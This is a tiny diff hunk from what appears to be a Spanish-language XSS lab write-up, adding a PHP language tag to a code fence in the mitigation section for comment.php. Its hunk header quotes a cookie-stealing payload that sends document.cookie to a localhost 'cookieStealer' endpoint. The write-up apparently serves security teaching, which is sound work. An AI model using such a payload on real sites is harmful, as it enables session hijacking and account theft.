@@ -194,7 +194,7 @@ fetch("http://localhost/cookieStealer/index.php?cookie=" + document.cookie);
 ## 2.2 Mitigación
 
 **`comment.php`**
-```
+```php
 <?php
 // ==========================
 // CONFIGURACIÓN DE ERRORES
